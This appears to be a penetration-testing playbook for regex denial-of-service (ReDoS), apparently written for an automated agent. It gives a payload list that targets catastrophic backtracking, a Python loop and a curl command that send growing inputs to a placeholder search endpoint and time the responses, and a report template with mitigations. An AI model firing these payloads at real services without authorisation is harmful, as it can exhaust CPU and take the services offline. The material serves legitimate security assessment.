# ReDoS (Regex DoS) Payloads

## Overview
ReDoS exploits catastrophic backtracking in vulnerable regular expressions,
causing high CPU usage and request timeouts.

## Phase 1: Identify Regex Sinks
```bash
# Look for validation error messages like:
# "invalid format", "invalid email", "invalid username"
# These often indicate regex validation.

# If source code is available, search for regex usage
# rg -n "regex|pattern|matches|re\.compile" /workspace/output/target_code/
```

## Phase 2: Payload List
```bash
cat > /workspace/output/TARGET_redos_payloads.txt <<'PAYLOADS'
# Nested quantifiers
# Regex: (a+)+$
aaaaaaaaaaaaaaaaaaaaaa!

# Alternation ambiguity
# Regex: (a|aa)+$
aaaaaaaaaaaaaaaaaaaaaa!

# Star inside group
# Regex: (.*a){10}
AAAAAAAAAAAAAAAAAAAA!

# Word-boundary repetition
# Regex: ^(\w+\s?)*$
word word word word word word word!

# Email regex (common)
# Regex: ^([\w\.-]+)+@([\w\.-]+)+$
aaaaaaaaaaaaaaaaaaaaaa!@bbbbbbbbbbbbbbbbbbbbb!

# URL-like regex (common)
# Regex: ^(https?://)?(www\.)?([\w-]+\.)+[\w-]{2,}$
http://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
PAYLOADS
```

## Phase 3: Gradual Length Increase
```bash
# Increase input length slowly to avoid crashing targets
python3 - <<'PY'
import time
import urllib.parse
import urllib.request

url = "https://TARGET/search"
base = "a"
for n in [10, 20, 40, 80, 160, 320]:
    payload = base * n + "!"
    data = urllib.parse.urlencode({"q": payload}).encode()
    start = time.time()
    urllib.request.urlopen(url, data=data, timeout=30).read()
    print(n, "len", "time", round(time.time() - start, 2))
PY
```

## Phase 4: Example Request
```bash
TARGET_URL="https://TARGET/search"

curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "q=aaaaaaaaaaaaaaaaaaaaaa!" \
  | tee /workspace/output/TARGET_redos_test_1.txt
```

## Report Template

```
Target: TARGET
Assessment Date: <DATE>

## Confirmed Findings
- [ ] Regex backtracking causes timeouts or high CPU

## Evidence
- Response timing: <metrics>
- Test response: /workspace/output/TARGET_redos_test_1.txt

## Recommendations
1. Avoid nested quantifiers and ambiguous alternations
2. Enforce input length limits
3. Use regex engines with timeouts / RE2
```

## Output Files
- `/workspace/output/TARGET_redos_payloads.txt` — payload list
- `/workspace/output/TARGET_redos_test_1.txt` — test response

indicators: redos, regex dos, catastrophic backtracking, regex payloads
